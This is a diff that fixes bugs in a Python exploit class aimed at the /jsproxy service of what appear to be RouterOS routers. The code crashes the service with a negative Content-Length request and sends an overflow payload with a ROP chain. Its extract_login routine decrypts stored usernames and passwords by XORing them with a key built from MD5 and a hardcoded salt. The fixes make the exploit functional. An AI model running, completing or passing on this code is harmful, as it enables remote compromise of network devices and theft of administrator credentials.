@@ -1,4 +1,4 @@
-import requests,socket
+import requests,socket,hashlib
 from time import sleep
 class Vuln():
 	long_stack=['6.33', '6.33.1', '6.33.2', '6.33.3', '6.33.5', '6.33.6', '6.34', '6.34.1', '6.34.2', '6.34.3', '6.34.4', '6.34.5', '6.34.6', '6.35', '6.35.1', '6.35.2', '6.35.4', '6.36', '6.36.1', '6.36.2', '6.36.3', '6.36.4', '6.37', '6.37.1', '6.37.2', '6.37.3', '6.37.4', '6.37.5', '6.38', '6.38.1', '6.38.2', '6.38.3', '6.38.4']
@@ -45,7 +45,7 @@ class Vuln():
 		s.send(data)
 		sleep(0.5)
 	def crash(self):
-		s = self.create_socket(1)[0]
+		s = self.create_sockets(1)[0]
 		self.send_data(s,"POST /jsproxy HTTP/1.1\r\nContent-Length: -1\r\n\r\n")
 		self.send_data(s,b'A' * 4096)
 		s.close()
@@ -54,13 +54,13 @@ class Vuln():
 		if self.vulnerable:
 			self.crash()
 			s1,s2=self.create_sockets(2)
-			stack_size=167936 if self.version in long_stack else 8425472
+			stack_size=167936 if self.version in self.long_stack else 8425472
 			self.send_data(s1,"POST /jsproxy HTTP/1.1\r\nContent-Length: %s\r\n\r\n"%stack_size)
 			self.send_data(s1,b'A'*(4076))
 			self.send_data(s2,"POST /jsproxy HTTP/1.1\r\nContent-Length: 32768\r\n\r\n")
-			# Its About Time (ʘ‿ʘ)
 			self.send_data(s1,self.ropChain)
 			s2.close()
+			sleep(2.5)
 		else:
 			print "How can I attack a target that is not vulnerable?"
 	def extract_login(self):
@@ -73,11 +73,11 @@ class Vuln():
 			usrdata=i.split(b"\x01\x00\x00\x21")[1]
 			pwddata=i.split(b"\x11\x00\x00\x21")[1]
 
-			username=usrdata[1:1+ord(usrdta[0])]
+			username=usrdata[1:1+ord(usrdata[0])]
 			pwdenc=pwddata[1:1+ord(pwddata[0])]
 
 			pwkey=hashlib.md5(username + b"283i4jfkai3389").digest()
-
+			password=""
 			for i in range(len(pwdenc)):
 				password+=chr(ord(pwdenc[i])^ord(pwkey[i%len(pwkey)]))
 
